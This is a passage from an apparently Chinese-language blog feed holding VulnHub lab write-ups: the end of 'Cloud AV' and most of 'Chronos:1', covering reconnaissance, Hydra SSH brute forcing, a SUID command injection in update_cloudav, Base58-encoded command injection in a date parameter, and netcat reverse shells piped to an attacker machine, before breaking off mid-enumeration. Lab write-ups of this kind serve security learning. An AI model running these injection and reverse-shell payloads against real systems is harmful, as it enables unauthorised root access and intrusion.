alt="image-20211009152831159"></p><p>显示只有一个字段password,下方的INSERT语句向数据库添加了几个密码，那是否可以登录目标系统？回想发现阶段目标系统上开启ssh服务，所以进行尝试，现在寻找目标系统上的用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153106205.png" alt="image-20211009153106205"></p><p>passwd文件中数据很多，需要做筛选过滤</p><p>筛选可以用<strong>shell权限</strong>登录系统的账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153238876.png" alt="image-20211009153238876"></p><p>将用户名和密码都分别生成字典 准备进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi user.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153516608.png" alt="image-20211009153516608"></p><p><img src="/Week2.assets/image-20211009153446916.png" alt="image-20211009153446916"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153702323.png" alt="image-20211009153702323"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153648892.png" alt="image-20211009153648892"></p><p>使用Hydra爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://10.0.2.7</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009154535990.png" alt="image-20211009154535990"></p><p>破解完成，失望，没有正确结果，这种攻击失败了，尝试别的攻击手段</p><h3 id="6-SUID提权"><a href="#6-SUID提权" class="headerlink" title="6.SUID提权"></a>6.SUID提权</h3><p>回到目标机目录下，尝试查看目录下别的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls samples</span><br></pre></td></tr></table></figure><p>发现这些文件就是Web界面那些可以进行防病毒扫描的文件</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009160341754.png" alt="image-20211009160341754"></p><p>暂时没有发现有帮助的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls templates</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009160512163.png" alt="image-20211009160512163"></p><p>看到template下有两个<strong>Web开发页面模板文件</strong> index.html scan.html，但也没有有帮助的信息</p><p>查看查看的目录，确认现在所在目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009164418370.png" alt="image-20211009164418370"></p><p>去上一级目录，&#x2F;home&#x2F;scanner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd .. </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la     #查看隐藏文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls- l</span><br></pre></td></tr></table></figure><p>在隐藏文件中并未发现有直接帮助的文件，但发现了.c文件</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165417380.png" alt="image-20211009165417380"></p><p>update_cloudav.c可能就是cloudav.app程序的C语言源代码，且可以看到这个程序的权限是<strong>可执行的</strong>，s也代表有suid权限位，且属主是root账号，当执行该程序时会<strong>默认继承该程序属主的权限</strong></p><p>设想：如果可以执行这个update_cloudav.c，是否可以通过某种命令注入的方法，<strong>利用suid权限</strong>带来的root权限来<strong>执行某些系统命令来反弹shell</strong>，来<strong>完成提权</strong>？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat update_cloudav.c</span><br></pre></td></tr></table></figure><blockquote><p>#include &lt;stdio.h&gt;</p><p>int main(int argc, char *argv[])<br>{<br>char *freshclam&#x3D;”&#x2F;usr&#x2F;bin&#x2F;freshclam”;</p><p>if (argc &lt; 2){<br>printf(“This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n”);<br>return 1;<br>}</p><p>char *command &#x3D; malloc(strlen(freshclam) + strlen(argv[1]) + 2);<br>sprintf(command, “%s %s”, freshclam, argv[1]);<br>setgid(0);<br>setuid(0);<br>system(command);<br>return 0;</p><p>}</p></blockquote><p>包含了一些<strong>头文件</strong>，定义了一些<strong>变量</strong>，变量指向了操作系统中的文件freshclam，freshclam是给开源杀毒软件cloudav的病毒库升级的软件。这个程序<strong>定义了一个执行参数</strong>，如果程序在执行过程中<strong>不包含</strong>这个参数的话就会<strong>显示信息</strong>，要求提交一个命令行的参数，这样freshclam这个程序才能正常执行，完成病毒库的更新。如果正确使用参数，那么就会正常的运行cloudav，执行病毒库的更新。</p><p>总结一下：当我们<strong>执行update_cloudav.c时</strong>，会<strong>调用</strong>了cloudav.app的<strong>病毒更新程序freshclam</strong>，但在执行过程中<strong>要求要有运行参数。</strong></p><p>先测试一个参数a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165635210.png" alt="image-20211009165635210"></p><p>出现日志文件<strong>报错</strong>，但是不确定是否会对执行有影响，继续尝试</p><p>利用管道符串联</p><p>在kali端: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 8888</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165823593.png" alt="image-20211009165823593"></p><p>在控制目标机端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav &quot;a | nc 10.0.2.4 7777 | /bin/bash | nc 10.0.2.4 8888&quot;</span><br></pre></td></tr></table></figure><p><strong>双引号作用：让.&#x2F;upadte_cloudav程序在执行的时候，认为双引号内的都是参数，从而继承这个程序它的suid位的权限</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165854532.png" alt="image-20211009165854532"></p><p>成功拿到目标系统root权限！</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; BoredHackerBlog: Cloud AV&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Date release:&lt;/strong&gt; 29 Mar 2020&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/author/boredhackerblog,683/&quot;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Series&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/series/boredhackerblog,295/&quot;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Download：&lt;/strong&gt;&lt;a href=&quot;https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova&quot;&gt;https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.&lt;/p&gt;
&lt;p&gt;Currently, it’s in beta mode. You’ve been asked to test the setup and find vulnerabilities and escalate privs.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Easy&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tasks involved:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;port scanning&lt;/li&gt;
&lt;li&gt;webapp attacks&lt;/li&gt;
&lt;li&gt;sql injection&lt;/li&gt;
&lt;li&gt;command injection&lt;/li&gt;
&lt;li&gt;brute forcing&lt;/li&gt;
&lt;li&gt;code analysis&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Virtual Machine:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Format: Virtual Machine (Virtualbox OVA)&lt;/li&gt;
&lt;li&gt;Operating System: Linux&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Networking:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DHCP Service: Enabled&lt;/li&gt;
&lt;li&gt;IP Address Automatically assign&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This works better with VirtualBox rather than VMware.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-3-Chronos:1</title>
    <link href="http://example.com/2022/04/12/week3/"/>
    <id>http://example.com/2022/04/12/week3/</id>
    <published>2022-04-12T07:08:53.099Z</published>
    <updated>2022-04-12T07:10:36.151Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Name</strong>: Chronos: 1</p><p><strong>Date release</strong>: 9 Aug 2021</p><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/al1enum,745/">AL1ENUM</a></p><p><strong>Series</strong>: <a href="https://www.vulnhub.com/series/chronos,495/">Chronos</a></p><p><strong>Download</strong>:<a href="https://download.vulnhub.com/chronos/Chronos.ova">https://download.vulnhub.com/chronos/Chronos.ova</a></p><p><strong>Description</strong></p><p><strong>Difficulty</strong> : medium</p><p>This works better with VirtualBox rather than VMware.</p></blockquote><span id="more"></span><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -r 10.0.2.0/24</span><br><span class="line">#netdiscover工具的使用中，发现在网段的真实掩码-8会扫描更快</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103144507677.png" alt="image-20211103144507677"></p><p><img src="/Week3.assets/image-20211103144432159.png" alt="image-20211103144432159"></p><p>发现存活主机，判断靶机IP为10.0.2.6 </p><h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.6</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011164411320.png" alt="image-20211011164411320"></p><h3 id="3-探测端口服务"><a href="#3-探测端口服务" class="headerlink" title="3.探测端口服务"></a>3.探测端口服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.6</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103144832211.png" alt="image-20211103144832211"></p><p>探测到的信息：</p><p>​22端口：开放<strong>SSH</strong>（7.6p1）</p><p>​80端口：<strong>Apache服务</strong></p><p>​目标为<strong>Ubuntu</strong>系统</p><p>​8000端口：<strong>Node.js</strong>    <strong>Express框架</strong></p><h3 id="4-浏览器访问80端口"><a href="#4-浏览器访问80端口" class="headerlink" title="4.浏览器访问80端口"></a>4.浏览器访问80端口</h3><p>访问80端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://10.0.2.6</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165055754.png" alt="image-20211011165055754"></p><p>信息:Chronos(靶机名)-Date（日期）&amp;Time（时间）</p><p>查看源代码，发现<strong>JS脚本</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165144187.png" alt="image-20211011165144187"></p><p>复制到编辑器内，发现“杂乱晦涩”</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165214660.png" alt="image-20211011165214660"></p><p>使用数据分析工具CyberChef调用“JavaScript Beautify”模块“美化”</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011170318994.png" alt="image-20211011170318994"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011170456326.png" alt="image-20211011170456326"></p><p>纵观美化后的代码，发现函数名称仍是为编码处理的，但发现可疑信息（URL）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure><p>分析：chronos（靶机名）</p><p>​local（本地&#x2F;本机）</p><p>​8000（结合之前探测到的信息8000端口也是目标开放的端口）</p><p>​data?format&#x3D;4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL（data变量<strong>通过format赋值定位某页面</strong>）</p><p>猜测：目标靶机80端口页面嵌入的脚本中包含了该URL</p><p>​怀疑是否<strong>在该页面加载的过程中</strong>：会去访问该URL–&gt;并从中读取相应页面资源–&gt;放置到当前页面中–&gt;显示相应信息</p><h3 id="5-页面绑定hosts"><a href="#5-页面绑定hosts" class="headerlink" title="5.页面绑定hosts"></a>5.页面绑定hosts</h3><p>思路：尝试在本地将10.0.2.6和chronos.loacl<strong>绑定</strong>–&gt;那么重新访问目标80端口（<a href="http://10.0.2.6)时--&gt;js脚本就能**顺利访问**脚本中的url--&gt;并从中**读取**相应**页面资源**--&gt;放置到当前页面中--&gt;显示相应的**信息**--&gt;页面应该会有**变化/">http://10.0.2.6）时--&gt;JS脚本就能**顺利访问**脚本中的URL--&gt;并从中**读取**相应**页面资源**--&gt;放置到当前页面中--&gt;显示相应的**信息**--&gt;页面应该会有**变化</a>**</p><p>操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hosts     </span><br><span class="line">#编辑hosts 手动增加 IP&amp;域名 绑定10.0.2.6和chronos.local</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171039018.png" alt="image-20211011171039018"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping chronos.local</span><br><span class="line">#验证绑定是否成功，结果显示域名被正确解析到目标靶机IP</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171625340.png" alt="image-20211011171625340"></p><p>结果显示，成功解析</p><p>刷新&#x2F;重新访问目标80端口（<a href="http://10.0.2.6)/">http://10.0.2.6）</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171725044.png" alt="image-20211011171725044"></p><p>页面上<strong>打印了时间</strong>，这样发生的<strong>变化</strong>–&gt;意味着JS脚本可以<strong>正常访问</strong>到URL上的资源了–&gt;至此建立了正常的连接</p><hr><h2 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h2><h3 id="1-截断抓包分析"><a href="#1-截断抓包分析" class="headerlink" title="1.截断抓包分析"></a>1.截断抓包分析</h3><p>打开Burpsuite，配置代理，利用截断功能，分析访问页面过程中发生的<strong>通信过程</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172836302.png" alt="image-20211011172836302"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172903372.png" alt="image-20211011172903372"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172917467.png" alt="image-20211011172917467"></p><p>通过分析发现<strong>目标响应返回了当前时间信息</strong>，也就是在页面上的显示的时间信息</p><p>将请求Request发送到Repeater内，不进行修改</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011173018704.png" alt="image-20211011173018704"></p><p>不修改时Send重放，正常访问200OK</p><p>修改后Send提交请求，能接收到服务器端的响应信息（时间）</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103152254081.png" alt="image-20211103152254081"></p><p>故可以得到一点，<strong>format参数后的字符</strong>4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL，<strong>对于返回时间是很关键的</strong></p><h3 id="2-命令注入漏洞"><a href="#2-命令注入漏洞" class="headerlink" title="2.命令注入漏洞"></a>2.命令注入漏洞</h3><p>使用CyberChef的Magic模块对该字符进行解密</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103151711496.png" alt="image-20211103151711496"></p><p>得到的明文为：（Base58编码…）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure><p>看到明文这样的格式，想到了Linux的date命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date</span><br></pre></td></tr></table></figure><p>date后添加明文内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103152932781.png" alt="image-20211103152932781"></p><p><strong>猜测当访问Web程序URL时，服务端使用的是这条操作系统指令，那么是否可以用符号连接执行命令注入呢？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27; || ls  #不可行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27; &amp;&amp; ls #可行</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153232194.png" alt="image-20211103153232194"></p><p>结合之前的URL，服务端能执行的内容必须是Base58编码之后的格式</p><p>故使用CyberChef将&amp;&amp;ls转为Base58编码形式</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153344923.png" alt="image-20211103153344923"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到：&amp;&amp;ls   --Base58编码--&gt;   yZSGA</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为yZSGA--&gt;Send重放</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153429917.png" alt="image-20211103153429917"></p><p>成功接受到服务端响应–&gt;返回当前目录下的文件信息–&gt;<strong>确认存在命令注入漏洞</strong></p><hr><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-利用思路"><a href="#1-利用思路" class="headerlink" title="1.利用思路"></a>1.利用思路</h3><p>如何利用命令注入漏洞？–&gt;<strong>尝试查看用户可执行文件目录（&#x2F;bin）</strong>–&gt;看是否有可利用点</p><p>CyberChef:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;ls /bin --To Base58--&gt;VAZYW9RHPu6D（下面不再为转码贴附图片**-_-**）</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为VAZYW9RHPu6D--&gt;Send重放</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153619965.png" alt="image-20211103153619965"></p><p>整理目前发现的<strong>可利用信息</strong>：</p><p>1.发现存在bash，之后若能获取shell，则可以执行bashell反弹</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085536530.png" alt="image-20211104085536530"></p><p>2.发现存在nc，但不确定nc版本是否有-e参数方便我们建立反弹shell （nc的-e参数具有程序重定向–连接执行的作用）</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153858760.png" alt="image-20211103153858760"></p><h3 id="2-使用nc建立连接"><a href="#2-使用nc建立连接" class="headerlink" title="2.使用nc建立连接"></a>2.使用nc建立连接</h3><h4 id="验证nc是否可执行"><a href="#验证nc是否可执行" class="headerlink" title="验证nc是否可执行"></a>验证nc是否可执行</h4><p>进行测试，确认nc命令能否正常执行？能否与kali建立反弹连接？</p><p>kali:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444    #nc侦听4444端口</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153939292.png" alt="image-20211103153939292"></p><p>CyberChef:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 --To Base58--&gt;2an39LDoLgxbVq6NMgJeN3RL7</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为2an39LDoLgxbVq6NMgJeN3RL7--&gt;Send重放</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085113440.png" alt="image-20211104085113440"></p><p>显示报错，但在kali端监听端发现<strong>连接可以被正常建立</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085132470.png" alt="image-20211104085132470"></p><h4 id="验证nc是否包含-e参数"><a href="#验证nc是否包含-e参数" class="headerlink" title="验证nc是否包含-e参数"></a>验证nc是否包含-e参数</h4><h5 id="1-若有则使用-e参数加载反弹shell"><a href="#1-若有则使用-e参数加载反弹shell" class="headerlink" title="1.若有则使用-e参数加载反弹shell"></a>1.若有则使用-e参数加载反弹shell</h5><p>kali：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444  #nc侦听4444端口</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085819231.png" alt="image-20211104085819231"></p><p>CyberChef:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 -e /bin/bash --To Base58--&gt;ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH--&gt;Send重放</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104090046890.png" alt="image-20211104090046890"></p><p>仍然报错，说明不包含-e参数，且nc建立连接失败，则<strong>确定目标系统上nc版本不包含-e参数</strong></p><h5 id="2-若无则可以使用nc串联的方法通过管道方式在两个侦听接口上获得反弹shell"><a href="#2-若无则可以使用nc串联的方法通过管道方式在两个侦听接口上获得反弹shell" class="headerlink" title="2.若无则可以使用nc串联的方法通过管道方式在两个侦听接口上获得反弹shell"></a>2.若无则可以使用<strong>nc串联</strong>的方法通过管道方式在两个侦听接口上获得反弹shell</h5><p>kali:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444  #nc侦听4444端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555  #nc侦听5555端口</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104092959229.png" alt="image-20211104092959229"></p><p>CyberChef:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 | /bin/bash | nc 10.0.2.4 5555</span><br></pre></td></tr></table></figure><p>–To Base58–&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS--&gt;Send重放</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104093156854.png" alt="image-20211104093156854"></p><p>至此，nc<strong>建立连接成功</strong></p><h3 id="3-寻找信息"><a href="#3-寻找信息" class="headerlink" title="3.寻找信息"></a>3.寻找信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104093314649.png" alt="image-20211104093314649"></p><p>发现在当前&#x2F;opt&#x2F;chronos目录下，并<strong>没有类似flag的信息</strong></p><p>尝试查看其他目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p>​<img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094438824.png" alt="image-20211104094438824"></p><p>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094604888.png" alt="image-20211104094604888"></p><p>​发现在home目录下<strong>存在用户imera</strong></p><p>​尝试查看imera用户文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd imera</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 